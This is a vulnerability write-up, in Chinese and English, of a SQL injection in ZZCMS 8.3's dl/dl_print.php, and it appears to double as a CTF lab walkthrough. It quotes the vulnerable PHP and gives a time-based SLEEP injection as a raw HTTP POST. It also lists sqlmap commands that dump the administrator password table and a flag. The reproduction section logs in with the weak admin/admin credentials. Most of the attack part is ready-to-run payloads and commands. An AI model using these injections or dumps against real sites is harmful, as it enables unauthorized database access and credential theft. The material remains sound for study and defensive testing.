## 1. 漏洞介绍
站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中dl/dl_print.php存在sql注入
[阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2021-40281)
## 2. 漏洞分析
[原理 + POC](https://gist.github.com/aaaahuia/583b062b686cdff27554e3c6fa5ac94e)
原理+POC备份
vulnerability code:
in file `dl/dl_print.php`
```php
<?php
include("../inc/conn.php");
...
#line 29-40
$id="";
$i=0;
if(!empty($_POST['id'])){
    for($i=0; $i<count($_POST['id']);$i++){
    $id=$id.($_POST['id'][$i].',');
    }
	
}else{
	$founderr=1;
	$ErrMsg="<li>操作失败！请先选中要下载的信息</li>";
}
$id=substr($id,0,strlen($id)-1);//去除最后面的","
...
#line 77-83
if (strpos($id,",")>0){
	$sql="select * from zzcms_dl where passed=1 and id in (". $id .") ";
	}else{
	$sql="select * from zzcms_dl where passed=1  and id=".$id." order by id desc";
}
	
$rs=query($sql);
```
Before you exploit the vulnerability, you need to visit this link to register users:
[http://127.0.0.1/reg/userreg.php](http://127.0.0.1/reg/userreg.php)
When you have an account, visit this link and the POC is as follows.
POC:
```http
POST /dl/dl_download.php HTTP/1.1
Host: your host
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://zzcms.com
Connection: close
Referer: http://zzcms.com/dl/dl_download.php
Cookie: UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6
Upgrade-Insecure-Requests: 1

id[0]=0&id[1]=1 AND (SELECT 5584 FROM (SELECT(SLEEP(9)))a)
```
sleep(9):
Screenshot link:[http://39.101.130.53/image-20210827005508639.png](http://39.101.130.53/image-20210827005508639.png)
You can also use sqlmap to verify this vulnerability. The specific usage is as follows:
**Note: please replace cookies and URLs with your own and make sure they are correct**
```shell
python sqlmap.py -u "http://zzcms.com/dl/dl_print.php" --cookie="UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6" --method POST --data "id[0]=0&id[1]=1" -p id[1] --tamper="between.py" --current-user --batch
```
Screenshot link:[http://39.101.130.53/image-20210827005636669.png](http://39.101.130.53/image-20210827005636669.png))
After waiting for a while, you can get the information you query, or you can change the statement. For example, the following statement is used to query the password of the administrator user:
```shell
python sqlmap.py -u "http://zzcms.com/dl/dl_print.php" --cookie="UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6" --method POST --data "id[0]=0&id[1]=1" -p id[1] --tamper="between.py" -D zzcms2021 -T zzcms_admin -C pass --dump  --batch
```
Screenshot link:[http://39.101.130.53/image-20210827010301240.png](http://39.101.130.53/image-20210827010301240.png))
## 3. 漏洞复现
开启环境后尝试访问 /dl/dl_print.php，结果被重定向至用户登录界面，尝试注册个账号，以失败告终。找管理员登录界面尝试用弱口令登录【admin/login.php：admin/admin】成功！在用户管理界面看到有几个待审用户，修改审核信息，再次到前面的用户登录界面登录。发布几个代理信息然后打印并抓包。
![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309191050975.png)

![6.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309191052062.png)

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309191050417.png)

![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309191050564.png)

sqlmap 示例

```shell
python sqlmap.py -u http://eci-2zebvn4b2ryprk38t4fa.cloudeci1.ichunqiu.com/dl/dl_print.php --cookie="UserName=22222; PassWord=934b535800b1cba8f96a5d72f72f1611" --method POST --data "id[0]=5&id[1]=1" -p id[1] --tamper="between.py" --dbs --batch
………………
python sqlmap.py -u http://eci-2zebvn4b2ryprk38t4fa.cloudeci1.ichunqiu.com/dl/dl_print.php --cookie="UserName=22222; PassWord=934b535800b1cba8f96a5d72f72f1611" --method POST --data "id[0]=5&id[1]=1" -p id[1] --tamper="between.py" --batch -D zzcms -T flag -C flag --dump
```

![4.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309191051773.png)

![4.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309191051774.png)

注，也可以直接将抓到的包存为 post.txt【可以删掉`FileExt=xls&sql=select+count%28*%29+as+total+from+zzcms_dl+where+passed%3C%3E0++and+classid%3D1&chkAll=checkbox&`】，用 sqlmap 跑【就是感觉有点慢】
```python
python sqlmap.py -r post.txt  -p id[1] --tamper="between.py" --batch --dbs --level=5 --risk=3
```

![7.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309191058465.png)
